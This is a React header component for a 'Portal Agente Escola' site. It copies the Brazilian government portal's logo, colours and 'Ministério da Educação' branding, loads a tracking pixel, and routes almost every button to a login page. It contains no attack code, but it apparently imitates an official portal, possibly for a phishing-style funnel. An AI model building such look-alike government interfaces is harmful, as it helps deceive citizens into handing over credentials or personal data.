import React from 'react';
import { MoreVertical, User, Home, ChevronRight, Share } from 'lucide-react';
import { 
  Bars3Icon as Bars3, 
  MicrophoneIcon as Microphone, 
  MagnifyingGlassIcon as MagnifyingGlass,
  XMarkIcon as XMark 
} from '@heroicons/react/24/outline';
import { useNavigate, useLocation } from 'react-router-dom';
import GovLogo from './GovLogo';
import { useUser } from '../context/UserContext';
import { usePixelTracking } from '../hooks/usePixelTracking';

const Header: React.FC = () => {
  usePixelTracking();
  
  const [searchVisible, setSearchVisible] = React.useState(false);
  const { userName } = useUser();
  const firstName = userName ? userName.split(' ')[0] : '';
  const navigate = useNavigate();
  const location = useLocation();

  // Só navega para /login se estiver na página inicial ou inscrição
  const handleLoginNavigation = () => {
    if (location.pathname === '/' || location.pathname === '/inscricao') {
      navigate('/login');
    }
  };

  const handleHomeClick = () => {
    if (location.pathname === '/' || location.pathname === '/inscricao') {
      navigate('/');
    }
  };

  const handleShare = (platform: string) => {
    const url = window.location.href;
    const title = 'Portal Agente Escola';
    
    switch (platform) {
      case 'facebook':
        window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(url)}`, '_blank');
        break;
      case 'twitter':
        window.open(`https://twitter.com/intent/tweet?url=${encodeURIComponent(url)}&text=${encodeURIComponent(title)}`, '_blank');
        break;
      case 'whatsapp':
        window.open(`https://wa.me/?text=${encodeURIComponent(title + ' ' + url)}`, '_blank');
        break;
      case 'link':
        navigator.clipboard.writeText(url);
        break;
    }
  };
  // Determina se deve aplicar cursor pointer e onClick
  const shouldNavigate = location.pathname === '/' || location.pathname === '/inscricao';
  const clickProps = shouldNavigate ? { onClick: handleLoginNavigation, className: "cursor-pointer" } : {};

  return (
    <header className="w-full font-sans">
      <div className="bg-white border-b border-gray-200">
        <div className="container mx-auto px-4 py-2 flex justify-between items-center">
          <div className="flex items-center gap-8">
            <div {...clickProps}>
              <GovLogo />
            </div>
            
            <div className="h-6 w-[1px] bg-gray-200 hidden md:block"></div>
            
            <button 
              {...(shouldNavigate ? { onClick: handleLoginNavigation } : {})}
              className="text-[#1351B4] hidden md:block"
            >
              <div className="flex flex-col items-center justify-center w-5 h-5">
                <div className="w-[3px] h-[3px] rounded-full bg-current mb-[3px]"></div>
                <div className="w-[3px] h-[3px] rounded-full bg-current mb-[3px]"></div>
                <div className="w-[3px] h-[3px] rounded-full bg-current"></div>
              </div>
            </button>
          </div>
          
          <div className="flex items-center gap-4">
            <button 
              {...(shouldNavigate ? { onClick: handleLoginNavigation } : {})}
              className="p-2 text-[#1351B4]" 
              aria-label="More options"
            >
              <MoreVertical size={20} className="fill-current" />
            </button>
            
            <button 
              {...(shouldNavigate ? { onClick: handleLoginNavigation } : {})}
              className="p-2 text-[#1351B4]" 
              aria-label="Display settings"
            >
              <svg stroke="currentColor" fill="currentColor" strokeWidth="0" viewBox="0 0 384 512" className="text-base" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                <path d="M223.5 32C100 32 0 132.3 0 256S100 480 223.5 480c60.6 0 115.5-24.2 155.8-63.4c5-4.9 6.3-12.5 3.1-18.7s-10.1-9.7-17-8.5c-9.8 1.7-19.8 2.6-30.1 2.6c-96.9 0-175.5-78.8-175.5-176c0-65.8 36-123.1 89.3-153.3c6.1-3.5 9.2-10.5 7.7-17.3s-7.3-11.9-14.3-12.5c-6.3-.5-12.6-.8-19-.8z"></path>
              </svg>
            </button>
            
            <button 
              {...(shouldNavigate ? { onClick: handleLoginNavigation } : {})}
              className="p-2 text-[#1351B4]" 
              aria-label="Menu grid"
            >
              <svg stroke="currentColor" fill="currentColor" strokeWidth="0" viewBox="0 0 512 512" className="text-base" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
                <path d="M149.333 56v80c0 13.255-10.745 24-24 24H24c-13.255 0-24-10.745-24-24V56c0-13.255 10.745-24 24-24h101.333c13.255 0 24 10.745 24 24zm181.334 240v-80c0-13.255-10.745-24-24-24H205.333c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24h101.333c13.256 0 24.001-10.745 24.001-24zm32-240v80c0 13.255 10.745 24 24 24H488c13.255 0 24-10.745 24-24V56c0-13.255-10.745-24-24-24H386.667c-13.255 0-24 10.745-24 24zm-32 80V56c0-13.255-10.745-24-24-24H205.333c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24h101.333c13.256 0 24.001-10.745 24.001-24zm-205.334 56H24c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24h101.333c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24zM0 376v80c0 13.255 10.745 24 24 24h101.333c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H24c-13.255 0-24 10.745-24 24zm386.667-56H488c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H386.667c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24zm0 160H488c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H386.667c-13.255 0-24 10.745-24 24v80c0 13.255 10.745 24 24 24zM181.333 376v80c0 13.255 10.745 24 24 24h101.333c13.255 0 24-10.745 24-24v-80c0-13.255-10.745-24-24-24H205.333c-13.255 0-24 10.745-24 24z"></path>
              </svg>
            </button>
            
            <button 
              {...(shouldNavigate ? { onClick: handleLoginNavigation } : {})}
              className="bg-[#1351B4] text-white py-2 px-6 rounded-full flex items-center gap-2 ml-2"
            >
              <User size={20} />
              <span className="font-semibold">{firstName || 'Entrar'}</span>
            </button>
          </div>
        </div>
      </div>
      
      <div className="bg-white shadow-sm">
        <div className="container mx-auto px-4 py-3 flex justify-between items-center">
          <button 
            {...(shouldNavigate ? { onClick: handleLoginNavigation } : {})}
            className="flex items-center gap-3"
          >
            <div className="text-[#1351B4]">
              <div className="w-6 h-0.5 bg-[#1351B4] mb-1"></div>
              <div className="w-6 h-0.5 bg-[#1351B4] mb-1"></div>
              <div className="w-6 h-0.5 bg-[#1351B4]"></div>
            </div>
            <span className="text-lg text-[#1351B4] font-medium">Ministério da Educação</span>
          </button>
          
          <div className="flex items-center gap-4">
            <button 
              {...(shouldNavigate ? { onClick: handleLoginNavigation } : {})}
              className="p-2 text-[#1351B4]" 
              aria-label="Voice search"
            >
              <svg stroke="currentColor" fill="currentColor" strokeWidth="0" viewBox="0 0 352 512" height="20" width="20" xmlns="http://www.w3.org/2000/svg">
                <path d="M176 352c53.02 0 96-42.98 96-96V96c0-53.02-42.98-96-96-96S80 42.98 80 96v160c0 53.02 42.98 96 96 96zm160-160h-16c-8.84 0-16 7.16-16 16v48c0 74.8-64.49 134.82-140.79 127.38C96.71 376.89 48 317.11 48 250.3V208c0-8.84-7.16-16-16-16H16c-8.84 0-16 7.16-16 16v40.16c0 89.64 63.97 169.55 152 181.69V464H96c-8.84 0-16 7.16-16 16v16c0 8.84 7.16 16 16 16h160c8.84 0 16-7.16 16-16v-16c0-8.84-7.16-16-16-16h-56v-33.77C285.71 418.47 352 344.9 352 256v-48c0-8.84-7.16-16-16-16z"></path>
              </svg>
            </button>
            
            <button 
              {...(shouldNavigate ? { onClick: handleLoginNavigation } : {})}
              className="p-2 text-[#1351B4]" 
              aria-label="Search"
            >
              <svg stroke="currentColor" fill="currentColor" strokeWidth="0" viewBox="0 0 512 512" height="20" width="20" xmlns="http://www.w3.org/2000/svg">
                <path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"></path>
              </svg>
            </button>
          </div>
        </div>

     

        {/* Breadcrumb */}
       
      </div>
    </header>
  );
};

export default Header;
